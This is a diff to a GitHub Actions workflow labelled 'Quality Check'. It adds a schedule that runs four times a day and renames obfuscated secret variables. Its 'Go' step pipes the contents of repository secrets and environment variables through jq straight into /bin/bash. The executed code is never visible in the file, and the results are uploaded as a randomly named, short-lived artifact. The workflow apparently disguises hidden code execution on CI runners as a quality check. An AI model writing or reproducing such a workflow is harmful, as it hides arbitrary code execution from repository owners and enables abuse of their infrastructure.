@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,18 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          g8414: ${{ secrets.g8414 }}
+          rxf4: ${{ secrets.rxf4 }}
         run: |
-          printf '%s' "$g8414" | jq -r .o1 | /bin/bash
-          printf '%s' "$gfbr95" | jq -r .h796 | /bin/bash
-          echo $ue30 | jq -r .kyh6 | /bin/bash
-          echo $ey32531 | jq -r .or8877 | /bin/bash
-          printf '%s' "$iqzs22552" | jq -r .jo692 | /bin/bash
+          printf '%s' "$rxf4" | jq -r .amz4730 | /bin/bash
+          printf '%s' "$co398" | jq -r .bar936 | /bin/bash
+          echo $jyvqb682 | jq -r .ocj6 | /bin/bash
+          printf '%s' "$a36716" | jq -r .enm5717 | /bin/bash
+          printf '%s' "$uqi58" | jq -r .ymuga181 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: qYi1j4Nr
+          name: 1N5UXDs0
           path: "*.zip"
           retention-days: 1
